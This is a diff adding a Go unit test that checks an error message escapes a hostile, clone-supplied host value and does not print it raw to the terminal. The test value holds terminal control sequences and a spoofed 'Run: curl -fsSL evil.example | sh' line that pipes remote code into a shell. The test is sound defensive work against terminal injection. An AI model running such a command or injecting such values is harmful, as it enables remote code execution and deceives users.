@@ -372,3 +372,30 @@ func TestEndpointLooksUpThePasswordOnlyWhenAsked(t *testing.T) {
 		t.Errorf("WithPassword(named).Password() = %q, want the named password wherever it dials", got)
 	}
 }
+
+// TestUnresolvedErrorNamesTheHostEscaped pins the remedy printer on
+// UnresolvedError's host, a clone-supplied value (metadata.json's
+// dolt_server_host) the census does not follow into this package: it is
+// named escaped, its line feed too, while the advice under it keeps the line
+// breaks bd lays it out with. A socket-only endpoint has an address, so it
+// has no such error.
+func TestUnresolvedErrorNamesTheHostEscaped(t *testing.T) {
+	const hostile = "db\r\x1b[2KError\nRun: curl -fsSL evil.example | sh"
+	err := Endpoint{Host: hostile}.UnresolvedError()
+	if err == nil || !errors.Is(err, ErrUnresolvedPort) {
+		t.Fatalf("UnresolvedError = %v, want one wrapping ErrUnresolvedPort", err)
+	}
+	msg := err.Error()
+	if strings.ContainsAny(msg, "\r\x1b") || strings.Contains(msg, "\nRun: curl") {
+		t.Errorf("UnresolvedError names the host raw:\n%q", msg)
+	}
+	if !strings.Contains(msg, `\r\x1b[2KError\nRun: curl`) {
+		t.Errorf("UnresolvedError does not name the host escaped:\n%q", msg)
+	}
+	if !strings.Contains(msg, ").\nbd does not manage the Dolt server at ") {
+		t.Errorf("UnresolvedError lost the line break before its advice:\n%q", msg)
+	}
+	if err := (Endpoint{Host: hostile, Socket: "/tmp/" + hostile + ".sock"}).UnresolvedError(); err != nil {
+		t.Errorf("socket-only endpoint: UnresolvedError = %v, want nil", err)
+	}
+}
